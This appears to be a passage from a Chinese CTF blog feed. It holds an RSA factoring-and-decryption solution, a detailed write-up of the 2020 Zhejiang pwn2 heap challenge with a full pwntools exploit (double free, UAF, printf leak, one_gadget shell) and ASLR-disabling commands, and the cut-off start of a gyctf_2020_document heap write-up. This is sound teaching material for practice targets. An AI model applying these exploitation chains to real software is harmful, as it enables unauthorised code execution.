class="number">3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858</span></span><br></pre></td></tr></table></figure><p>题目给了n和密文，还给了p和q的关系式，但是n是600多位十进制数直接分解不太现实，即便确定了p和q的位数复杂度也不允许。而且它数据刚刚好，python无法直接表示，所以我们就很难用python写这个分解n的脚本。这里有一个很好用的东西：java大数，java大数是字符串封装的可以运算的数，那么我们就可以通过这个很好的运算了。</p><p>既然直接分析不可行的话那么采取其它策略——爆破</p><h2 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h2><p>思想是确定p的位数，然后q=p+x，从高位枚举，直到p*(p+x)刚好&lt;n确定这一位数，就算p是300多位，每位枚举10中情况复杂度也不算高，那么这个就用java写脚本爆破了。</p><p>首先确定一下p的位数，这个很难简单，直接随便取若干位数为p，再算(p+x)*p与n相除，若得出来的值不超过10那基本就是这么多位数了，这里算出来位数是310位</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.math.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">bignumber</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        BigInteger n = <span class="keyword">new</span> BigInteger(<span class="string">&quot;27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603&quot;</span>);</span><br><span class="line">        BigInteger x = <span class="keyword">new</span> BigInteger(<span class="string">&quot;3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858&quot;</span>);</span><br><span class="line">        BigInteger i = <span class="keyword">new</span> BigInteger(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">310</span>;j&gt;=<span class="number">1</span>;j--) &#123;</span><br><span class="line">            String s=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;j-<span class="number">1</span>;k++) &#123;</span><br><span class="line">                s+=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            BigInteger pow=<span class="keyword">new</span> BigInteger(s);</span><br><span class="line">            <span class="comment">//System.out.println(pow);</span></span><br><span class="line">            <span class="keyword">int</span> bit=<span class="number">10</span>;</span><br><span class="line">            BigInteger p=<span class="keyword">new</span> BigInteger(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                bit--;</span><br><span class="line">                BigInteger m=pow.multiply(<span class="keyword">new</span> BigInteger(Integer.toString(bit)));</span><br><span class="line">                BigInteger a=m.add(i);</span><br><span class="line">                p=a.multiply(a.add(x));</span><br><span class="line">            &#125;<span class="keyword">while</span>(n.compareTo(p)==-<span class="number">1</span>);</span><br><span class="line">            <span class="comment">//System.out.println(bit);</span></span><br><span class="line">            i=i.add(pow.multiply(<span class="keyword">new</span> BigInteger(Integer.toString(bit))));</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/1.png" alt="1"></p><p>很容易就爆破出来了，最终得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">164388402596326998398734266483348689718634308613134769513823133531277866932924580863368129180110157251658299906566819446945741582875064595447688991363818514760290461718304500609014489162133123761201603375706506435381197548902899274601380329856241471126508515906897368912158915277705061990280370468267906281833</span></span><br></pre></td></tr></table></figure><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">27552304606229034903366058815849954030287648695063385362955432137790872571412035824128918674719247737295565001575991597519270789776408208970323808016733976338433371328100880898942106515627607388226912870981180215883273805491209461671730377099185278711453949265641966582563910708529619185885928310168288810488784242368160743359666583499117949407921812317700250240067929572558785431071173411100434109661677786734923283679392823901052633992456780285091988542875991410528415886437666510014123352497264017734716859350294159440761760921548702546470902740121962033241003215821780125194400741190925169397917247376657863011603</span></span><br><span class="line">p=<span class="number">164388402596326998398734266483348689718634308613134769513823133531277866932924580863368129180110157251658299906566819446945741582875064595447688991363818514760290461718304500609014489162133123761201603375706506435381197548902899274601380329856241471126508515906897368912158915277705061990280370468267906281833</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">8643831704675414121804983915084443744489969712473300784256427784417167322852556975560503484179280700293119974607254037642425650493676448134024809335297135239994950178868535219541095694358323044214971760829173918774094415933808417722001811285178546917655837402000771685507972240389565704149610032767242977174132826100177368764169367458684152505611469248099487912367364804360878611296860803835816266114046682291529593099394952245852157119233687981777202751472502060481232341206366584532964027749320641690448228420342308891797513656897566100268729012788419021059054907653832828437666012596894150751431936476816983845357</span></span><br><span class="line">x=<span class="number">3216514606297172806828066063738105740383963382396892688569683235383985567043193404185955880509592930874764682428425994713750665248099953457550673860782324431970917492727256948066013701406000049963109681898567026552657377599263519201715733179565306750754520746601394738797021362510415215113118083969304423858</span></span><br><span class="line">q=p+x</span><br><span class="line"></span><br><span class="line">d=inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag=long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="/2021/10/27/2021%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9BRSA/2.png" alt="2"></p><p>得到flag=flag{9c0532a253809f180747b6da334b438f}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020浙江省赛 pwn2 writeup</title>
      <link href="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/"/>
      <url>/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/</url>
      
        <content type="html"><![CDATA[<p>国庆复的盘，今天补一下</p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec保护全开。</p><p>经典菜单题，没有去符号表，查看menu函数发现只有添加和删除操作，但是可以发现删除操作是通过函数指针实现的。并且分little 和 big的区别，free little就是一个free，free big 就是要把那个堆块里面的内容指向的堆块free了还要把本身给free，但是指针并没有清零。造成了UAF漏洞，并且在add的时候根据字符串长度来分配大小，并且会先读栈上，然后在strcpy拷贝，这就意味着输入不能存在\0。并且你输入的size只跟你输入大小有关，它拷贝分配的大小还是用strlen算出来长度再malloc然后strcpy，这一波操作下来就没办法溢出操作，并且由于\0截断也限制了很多。开了PIE无法unlink，和用got表泄露libc，而泄露程序基址也是比较难的(虽然正解是泄露程序基址的awa)。</p><h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><p>考虑劫持函数指针，直接覆盖部分来修改函数，发现freebig和freelittle函数指针都在堆上面，由于只有最后三位相同，而我们覆盖是以字节为单位的，在调试可以选择先关了ASLR，让它在确定位置上加载不妨碍调试，出了之后也就需要爆破这半个字节十六分之一的概率还是比较可观的。但是我的电脑不知道为什么特殊一点的，它程序加载的基址末五位都是0，那这样我调试就更加方便了，直接写上两个字节过去就完事了。如果你的你的机子没有这个特性可以参考以下操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo su</span><br><span class="line">#echo 0 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>这一波操作之后会让程序和libc在确定的基址上运行，这样如果需要爆破，调试起来就更方便了，我的机子重启之后这个默认变回2的好像。</p><p>那么我们就先用double free的方式将堆块申请到伪造的区域造成堆重叠覆盖指针区域为printf，至于为什么printf呢，那是因为可以用%p泄露栈或寄存器上的变量，栈上面或多或少都会有libc的地址存在的。</p><p>那我们先添加五组堆块</p><p>第一个堆块：big ，在数据区域伪造出一个0x31大小的堆块一遍等会申请。</p><p>第二个堆块：big，把它的size区域变成0x31以便等会申请。</p><p>第三个堆块：small，用于double free 的堆块</p><p>第四个堆块：small，用于double free 的堆块</p><p>第五个堆块：small，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#交互函数会在最后完整的exp中给出</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x31\0&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>此时堆布局是这样的：</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/1.png" alt="1"></p><p>箭头所指的两个地方就是要伪造堆块的区域。</p><p>然后free掉第三个第四个第三个的顺序让bin中存在两个相同的堆块，add第一个堆块的时候末尾因为有其它堆块的地址，因此直接改最后一位即可以把fd改成刚刚第二个堆伪造的size区域，等会申请到这里的堆块之后就可以直接修改末尾的指针把这个free big函数改成printf函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(p32(<span class="number">0x9a0</span>))<span class="comment">#6</span></span><br></pre></td></tr></table></figure><p>此时堆布局如下所示</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/2.png" alt="2"></p><p>由于改变了堆结构导致指令无法识别到堆块了，但那些不重要，我们可以看到那个原本存free big的函数已经变成了printf函数的偏移(0x9a0)。</p><p>改完之后呢，依旧是用第三个堆块和第四个堆块double free，然后把堆块申请到第一个伪造的那个地方。然后free第一个堆块，而我们这一次申请就在上面填上类似%p之类的字符，为什么能成功呢？仔细看它delete一个堆块的操作，是以堆块的地址作为参数的而不是以堆块的内容作为参数。所以如果上面放上%p之类的字符串，delete 之后就会printf这堆块上的内容，识别到%p之类的格式化字符串就会对应泄露出一些地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;%4$p&#x27;</span>+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>做完这些操作之后可以看到一下堆块的布局。</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/3.png" alt="3"></p><p>free 1之后可以泄露出一个类似libc的地址。</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/4.png" alt="4"></p><p>因为这属于无差别泄露，就是说你其实也不知道这个泄露的是个什么鬼东西，那你就直接vmmap查看libc的code段加载地址在哪里，再把这个数和基址一减，得到一个偏移，那么接受到这个数值之后减去那个偏移就能固定泄露出libc的基址了。</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/5.png" alt="5"></p><p>虽然泄露出来的地址属于ld.so中的地址，但是由于libc和ld.so是紧挨着的，不妨碍能通过它泄露出libc的地址，最后计算得到偏移0x5ed700。到这里泄露libc的工作就算完成啦。</p><h2 id="劫持程序流"><a href="#劫持程序流" class="headerlink" title="劫持程序流"></a>劫持程序流</h2><p>这里还是靠函数指针，既然libc地址已经泄露得到了，那么可以故技重施，再把函数指针改成system，然后参数给/bin/sh，delete之后直接getshell，非常稳，当然这里我偷懒了，我直接换成onegadget的地址了，因为后期考虑到堆块数量可能不够，它堆块指针的分配机制是这样的：</p><p>建立一个数组a，初始都为0，每次add，会把这个数组置为1，free把对应这个下标置为0。add只会考虑该数组这个下标的值为0的时候才会分配对应偏移的指针给当前add的堆块。但是由于之前我们用过了很多double free，因为有两次free是对同一个堆块操作，那个数组虽然会变成0，但是也有两次是对同一个元素操作了，我们整整又是拿出来了三个堆块，所以每次double free可用的数组指针永久少1，并且由于之前那些操作，可以利用的堆可以说以我目前的能力我是想放弃那些堆块重新开始的。因此再次的double free 只需要劫持一个函数指针为onegadget即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x31</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(p64(libc_base+one[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里也很幸运，试到第三个onegadget就成功了。如果不行应该换成system然后之前再同样的方式弄出来/bin/sh字符串就行，但是我不确定堆块数量能不能够用。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;2.Remove a candy:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10000</span>))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Taste: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;2.Remove a candy:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;id:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./candyBox&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x31\0&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(p32(<span class="number">0x9a0</span>))<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#free(0)</span></span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;\x50\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;%4$p&#x27;</span>+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x5ed700</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sys=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;malloc_hook:&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x31</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;\x78\0&#x27;</span>)</span><br><span class="line">add(p64(libc_base+one[<span class="number">2</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>下面是成功getshell的截图，最后写出来需要爆破的就是printf那半个字节，跑到远程环境注意一下应该问题不大。</p><p><img src="/2021/10/26/2020%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn2/6.png" alt="6"></p><h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>本题目来源于zjctf2020决赛的pwn2，据说那题也没多少人做出来，而我虽然能自己独立做出来，但是整整花了9个小时，听说去年决赛总共也就8个小时qwq。</p><p>这真的是我做过的最难的uaf漏洞的题目了，我原本以为它应该就跟那种没有任何特殊字符过滤的sql注入差不多，没想到它到处加限制导致很多漏洞很难利用，也算是给我展示了一波吧，希望这次的省赛能让我出一道pwn吧，加油冲冲冲！</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gyctf_2020_document write up</title>
      <link href="/2021/10/26/gyctf_2020_document/"/>
      <url>/2021/10/26/gyctf_2020_document/</url>
      
        <content type="html"><![CDATA[<p>今天来康康这道题<a href="https://buuoj.cn/challenges#gyctf_2020_document">gyctf_2020_document</a></p><span id="more"></span><h2 id="静态分析确定漏洞类型"><a href="#静态分析确定漏洞类型" class="headerlink" title="静态分析确定漏洞类型"></a>静态分析确定漏洞类型</h2><p>经典的堆菜单题，保护全开，2.23的libc。保护全开意味着got表劫持不了。增删改查四样动作都有，并且没有那种虚晃一枪(例如show函数直接给你puts一个too young too simple之类的)的函数。</p><p>先看add函数，malloc了两个堆块，都是固定大小，一个堆块是0x20大小，另一个是0x90大小。然后第二个堆块的指针存在了第一个堆块上面。第一个堆块后八个字节用来存了性别，性别要么1要么16，是通过判断你输入的是否为W来决定的。之后就是那个0x90的大堆块上面存一个名字，中间间隔一个flag，然后堆块偏移0x10的位置上面放上你要输入的内容。</p><p>看看delete函数，存在明显 的UAF漏洞，可以操作free的堆块。并且只free 0x90的堆块而0x20的堆块不会free。那么通过这些分析我们就可以先add两个堆块，free掉第一个之后show第一个就能泄露出libc的地址。</p><p>其它的中规中矩，唯独edit函数正常情况下它每个堆块只允许edit一次，但也只是因为那个0x20堆块的后面的那个flag原因。</p><h2 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h2><p>这里建议，name强制8位就不要想这么多直接给<code>/bin/sh;</code>就完了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;/bin/sh;&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">b&#x27;/bin/sh;&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>得到libc地址</p><p><img src="/2021/10/26/gyctf_2020_document/1.png" alt="1"></p><h2 id="确定攻击思路"><a href="#确定攻击思路" class="headerlink" title="确定攻击思路"></a>确定攻击思路</h2><p>构造堆重叠以此能修改0x20堆块上面的指针到<code>free_hook</code>去覆盖<code>free_hook</code>为system函数，再free一个带有/bin/sh的堆块就可以getshell，此时bin中已经有一个0x90的<code>unsorted bin</code>，再次add一个因为先分配了这个0x20的堆块，<code>unsorted bin</code>就会进行切割，但是edit 0发现它在0x10偏移上edit的，因此不行。不行咱就再换一个嘛，再add一次，此时的<code>unsorted 